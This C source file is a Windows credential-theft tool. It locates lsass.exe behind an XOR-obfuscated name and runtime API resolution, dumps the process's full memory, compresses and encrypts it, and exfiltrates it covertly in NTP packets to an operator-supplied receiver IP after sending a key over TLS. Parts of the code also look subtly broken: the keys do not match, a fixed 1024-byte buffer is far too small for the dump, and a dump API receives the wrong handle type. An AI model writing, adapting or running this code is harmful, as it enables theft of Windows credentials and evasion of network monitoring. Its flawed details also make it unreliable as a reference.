#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <zlib.h>
#include <ws2tcpip.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "DbgHelp.lib")

#define NTP_PACKET_SIZE 48
#define PAYLOAD_SIZE 8
#define AES_KEY_SIZE 32
#define AES_IV_SIZE 12
#define AES_TAG_SIZE 16
#define COMPRESSED_BUFFER_SIZE 1024

// Function to send AES key and IV securely via TLS
int send_key_securely(const char *target_ip, int target_tls_port, const unsigned char *key, const unsigned char *iv) {
    SSL_library_init();
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) {
        fprintf(stderr, "[!] Error initializing SSL_CTX.\n");
        return -1;
    }

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        fprintf(stderr, "[!] Error creating TLS socket.\n");
        SSL_CTX_free(ctx);
        return -1;
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_tls_port);
    server_addr.sin_addr.s_addr = inet_addr(target_ip);

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        fprintf(stderr, "[!] TLS connection failed.\n");
        closesocket(sock);
        SSL_CTX_free(ctx);
        return -1;
    }

    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    if (SSL_connect(ssl) <= 0) {
        fprintf(stderr, "[!] SSL connection error.\n");
        SSL_free(ssl);
        closesocket(sock);
        SSL_CTX_free(ctx);
        return -1;
    }

    // Send the key and IV
    SSL_write(ssl, key, AES_KEY_SIZE);
    SSL_write(ssl, iv, AES_IV_SIZE);

    fprintf(stderr, "[+] AES key and IV sent via TLS.\n");

    SSL_free(ssl);
    closesocket(sock);
    SSL_CTX_free(ctx);
    return 0;
}

// Function to decode a string obfuscated with XOR
void DecodeString(const wchar_t *encoded, int key, wchar_t *decoded, size_t maxLen) {
    size_t i = 0;
    while (encoded[i] != L'\0' && i < maxLen - 1) {
        decoded[i] = encoded[i] ^ key;
        i++;
    }
    decoded[i] = L'\0';
}

// Function to get the PID of a target process by name
DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
    DWORD pid = 0;
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32)
        return 0;

    typedef HANDLE (WINAPI *pCreateToolhelp32Snapshot)(DWORD, DWORD);
    typedef BOOL (WINAPI *pProcess32FirstW)(HANDLE, LPPROCESSENTRY32);
    typedef BOOL (WINAPI *pProcess32NextW)(HANDLE, LPPROCESSENTRY32);
    typedef BOOL (WINAPI *pCloseHandle)(HANDLE);

    pCreateToolhelp32Snapshot fCreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
    pProcess32FirstW fProcess32FirstW = (pProcess32FirstW)GetProcAddress(hKernel32, "Process32FirstW");
    pProcess32NextW fProcess32NextW = (pProcess32NextW)GetProcAddress(hKernel32, "Process32NextW");
    pCloseHandle fCloseHandle = (pCloseHandle)GetProcAddress(hKernel32, "CloseHandle");

    if (!fCreateToolhelp32Snapshot || !fProcess32FirstW || !fProcess32NextW || !fCloseHandle)
        return 0;

    HANDLE hSnapshot = fCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (fProcess32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, targetProcessName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (fProcess32NextW(hSnapshot, &pe));
    }
    fCloseHandle(hSnapshot);
    return pid;
}

// Function to dump the memory of a target process
BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
    HMODULE hDbgHelp = LoadLibrary(L"DbgHelp.dll");
    if (!hDbgHelp)
        return FALSE;

    typedef BOOL (WINAPI *MiniDumpWriteDumpType)(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE,
        PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION);
    MiniDumpWriteDumpType MiniDumpWriteDumpFunc = (MiniDumpWriteDumpType)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
    if (!MiniDumpWriteDumpFunc) {
        FreeLibrary(hDbgHelp);
        return FALSE;
    }

    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32) {
        FreeLibrary(hDbgHelp);
        return FALSE;
    }
    typedef HANDLE (WINAPI *pOpenProcess)(DWORD, BOOL, DWORD);
    typedef HANDLE (WINAPI *pCreateFileMappingW)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
    typedef LPVOID (WINAPI *pMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
    typedef BOOL (WINAPI *pUnmapViewOfFile)(LPCVOID);
    typedef BOOL (WINAPI *pCloseHandle)(HANDLE);

    pOpenProcess fOpenProcess = (pOpenProcess)GetProcAddress(hKernel32, "OpenProcess");
    pCreateFileMappingW fCreateFileMappingW = (pCreateFileMappingW)GetProcAddress(hKernel32, "CreateFileMappingW");
    pMapViewOfFile fMapViewOfFile = (pMapViewOfFile)GetProcAddress(hKernel32, "MapViewOfFile");
    pUnmapViewOfFile fUnmapViewOfFile = (pUnmapViewOfFile)GetProcAddress(hKernel32, "UnmapViewOfFile");
    pCloseHandle fCloseHandle = (pCloseHandle)GetProcAddress(hKernel32, "CloseHandle");

    if (!fOpenProcess || !fCreateFileMappingW || !fMapViewOfFile || !fUnmapViewOfFile || !fCloseHandle) {
        FreeLibrary(hDbgHelp);
        return FALSE;
    }

    HANDLE hProcess = fOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        FreeLibrary(hDbgHelp);
        return FALSE;
    }

    size_t bufferSize = 0x1000000; // 16 MB
    HANDLE hMapping = fCreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, (DWORD)bufferSize, NULL);
    if (!hMapping) {
        fCloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        return FALSE;
    }
    void* buffer = fMapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, bufferSize);
    if (!buffer) {
        fCloseHandle(hMapping);
        fCloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        return FALSE;
    }
    BOOL success = MiniDumpWriteDumpFunc(hProcess, pid, hMapping, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (success) {
        *dumpBuffer = (char*)malloc(bufferSize);
        if (!*dumpBuffer) {
            fUnmapViewOfFile(buffer);
            fCloseHandle(hMapping);
            fCloseHandle(hProcess);
            FreeLibrary(hDbgHelp);
            return FALSE;
        }
        memcpy(*dumpBuffer, buffer, bufferSize);
        *dumpSize = bufferSize;
    }
    fUnmapViewOfFile(buffer);
    fCloseHandle(hMapping);
    fCloseHandle(hProcess);
    FreeLibrary(hDbgHelp);
    return success;
}

// Function to compress a buffer using zlib
int CompressBuffer(const char *inputBuffer, size_t inputSize, char **compressedBuffer, size_t *compressedSize) {
    uLong bound = compressBound(inputSize);
    *compressedBuffer = (char*)malloc(bound);
    if (!*compressedBuffer)
        return Z_MEM_ERROR;
    int res = compress((Bytef*)*compressedBuffer, &bound, (const Bytef*)inputBuffer, inputSize);
    if (res == Z_OK) {
        *compressedSize = bound;
    } else {
        free(*compressedBuffer);
    }
    return res;
}

// Function to create an NTP packet with a payload
void CreateNTPPacket(const unsigned char payload[8], unsigned char packet[48]) {
    memset(packet, 0, 48);
    packet[0] = 0x1B; // LI=0, VN=3, Mode=3
    memcpy(packet + 40, payload, 8);
}

// Function to send an NTP packet via UDP
int SendNTPPacket(const char *target_ip, int target_port, const unsigned char payload[8]) {
    HMODULE hWs2_32 = GetModuleHandleW(L"ws2_32.dll");
    if (!hWs2_32)
        return -1;

    typedef int (WSAAPI *pWSAStartup)(WORD, LPWSADATA);
    typedef SOCKET (WSAAPI *pSocket)(int, int, int);
    typedef int (WSAAPI *pSendTo)(SOCKET, const char*, int, int, const struct sockaddr*, int);
    typedef int (WSAAPI *pClosesocket)(SOCKET);
    typedef int (WSAAPI *pWSACleanup)(void);

    pWSAStartup fWSAStartup = (pWSAStartup)GetProcAddress(hWs2_32, "WSAStartup");
    pSocket fSocket = (pSocket)GetProcAddress(hWs2_32, "socket");
    pSendTo fSendTo = (pSendTo)GetProcAddress(hWs2_32, "sendto");
    pClosesocket fClosesocket = (pClosesocket)GetProcAddress(hWs2_32, "closesocket");
    pWSACleanup fWSACleanup = (pWSACleanup)GetProcAddress(hWs2_32, "WSACleanup");

    if (!fWSAStartup || !fSocket || !fSendTo || !fClosesocket || !fWSACleanup)
        return -1;

    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    int result = 0;
    if (fWSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return -1;
    sock = fSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        fWSACleanup();
        return -1;
    }
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(target_port);
    InetPton(AF_INET, target_ip, &addr.sin_addr);

    unsigned char packet[48];
    CreateNTPPacket(payload, packet);
    result = fSendTo(sock, (const char*)packet, 48, 0, (struct sockaddr*)&addr, sizeof(addr));
    fClosesocket(sock);
    fWSACleanup();
    return result;
}

// Function to send a compressed dump as NTP packets
int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *data, size_t data_size) {
    unsigned char key[AES_KEY_SIZE], iv[AES_IV_SIZE], tag[AES_TAG_SIZE];
    unsigned char compressed_data[COMPRESSED_BUFFER_SIZE];
    unsigned long compressed_size = COMPRESSED_BUFFER_SIZE;

    // Compress data
    if (compress(compressed_data, &compressed_size, (const unsigned char *)data, data_size) != Z_OK) {
        fprintf(stderr, "[!] Compression failed.\n");
        return -1;
    }

    // Encrypt data using AES-GCM
    RAND_bytes(key, AES_KEY_SIZE);
    RAND_bytes(iv, AES_IV_SIZE);
    unsigned char encrypted_data[compressed_size];

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int len;
    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, encrypted_data, &len, compressed_data, compressed_size);
    EVP_EncryptFinal_ex(ctx, encrypted_data + len, &len);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, AES_TAG_SIZE, tag);
    EVP_CIPHER_CTX_free(ctx);

    int fragment_size = 4;
    int total_fragments = (compressed_size + fragment_size - 1) / fragment_size;

    // Prepare header packet
    unsigned char header[8];
    header[0] = (total_fragments >> 24) & 0xFF;
    header[1] = (total_fragments >> 16) & 0xFF;
    header[2] = (total_fragments >> 8) & 0xFF;
    header[3] = total_fragments & 0xFF;
    header[4] = ((unsigned int)compressed_size >> 24) & 0xFF;
    header[5] = ((unsigned int)compressed_size >> 16) & 0xFF;
    header[6] = ((unsigned int)compressed_size >> 8) & 0xFF;
    header[7] = ((unsigned int)compressed_size) & 0xFF;

    if (SendNTPPacket(target_ip, target_port, header) == SOCKET_ERROR) {
        fprintf(stderr, "[!] Failed to send header packet.\n");
        return -1;
    }
    fprintf(stderr, "[+] Header sent: %d fragments, %zu bytes total.\n", total_fragments, compressed_size);

    // Send data packets
    for (int seq = 0; seq < total_fragments; seq++) {
        unsigned char payload[8];
        payload[0] = (seq >> 24) & 0xFF;
        payload[1] = (seq >> 16) & 0xFF;
        payload[2] = (seq >> 8) & 0xFF;
        payload[3] = seq & 0xFF;
        int offset = seq * fragment_size;
        int remaining = compressed_size - offset;
        int copySize = (remaining < fragment_size) ? remaining : fragment_size;
        memset(payload + 4, 0, 4);
        if (copySize > 0)
            memcpy(payload + 4, encrypted_data + offset, copySize);
        if (SendNTPPacket(target_ip, target_port, payload) == SOCKET_ERROR) {
            fprintf(stderr, "[!] Failed to send packet %d.\n", seq + 1);
            return -1;
        }
        fprintf(stderr, "[+] Packet %d/%d sent.\n", seq + 1, total_fragments);
    }
    fprintf(stderr, "[+] Transmission completed.\n");
    return 0;
}

int main(void) {
    // Obfuscated target process name "lsass.exe"
    wchar_t encodedTarget[] = { 'l' ^ 0x13, 's' ^ 0x13, 'a' ^ 0x13, 's' ^ 0x13,
                                  's' ^ 0x13, '.' ^ 0x13, 'e' ^ 0x13, 'x' ^ 0x13,
                                  'e' ^ 0x13, L'\0' };
    wchar_t targetProcessName[256];
    DecodeString(encodedTarget, 0x13, targetProcessName, 256);
    wprintf(L"[*] Decoded target process: %s\n", targetProcessName);

    char target_ip[64];
    int target_port;
    printf("[*] Enter receiver IP: ");
    if (scanf("%63s", target_ip) != 1) {
        fprintf(stderr, "[!] Failed to read IP.\n");
        return 1;
    }
    printf("[*] Enter receiver port: ");
    if (scanf("%d", &target_port) != 1) {
        fprintf(stderr, "[!] Failed to read port.\n");
        return 1;
    }

    unsigned char key[AES_KEY_SIZE], iv[AES_IV_SIZE], tag[AES_TAG_SIZE];
    RAND_bytes(key, AES_KEY_SIZE);
    RAND_bytes(iv, AES_IV_SIZE);

    if (send_key_securely(target_ip, target_port, key, iv) < 0) {
        fprintf(stderr, "[!] Failed to send AES key via TLS.\n");
        return 1;
    }

    DWORD pid = GetTargetProcessPID(targetProcessName);
    if (pid == 0) {
        fprintf(stderr, "[!] Process not found.\n");
        return 1;
    }
    wprintf(L"[+] Process %s found with PID %lu\n", targetProcessName, pid);

    char *dumpBuffer = NULL;
    size_t dumpSize = 0;
    if (!DumpProcessToMemory(pid, &dumpBuffer, &dumpSize)) {
        fprintf(stderr, "[!] Failed to dump process memory.\n");
        return 1;
    }
    fprintf(stderr, "[+] Memory dump completed. Size: %zu bytes.\n", dumpSize);

    char *compressedBuffer = NULL;
    size_t compressedSize = 0;
    int compRes = CompressBuffer(dumpBuffer, dumpSize, &compressedBuffer, &compressedSize);
    free(dumpBuffer);
    if (compRes != Z_OK) {
        fprintf(stderr, "[!] Failed to compress dump. Error: %d\n", compRes);
        return 1;
    }
    fprintf(stderr, "[+] Compression completed. Compressed size: %zu bytes.\n", compressedSize);

    if (SendCompressedDumpAsNTP(target_ip, target_port, compressedBuffer, compressedSize) != 0) {
        fprintf(stderr, "[!] Failed to send compressed dump to receiver.\n");
        free(compressedBuffer);
        return 1;
    }
    free(compressedBuffer);
    fprintf(stderr, "[+] Done!\n");
    return 0;
}
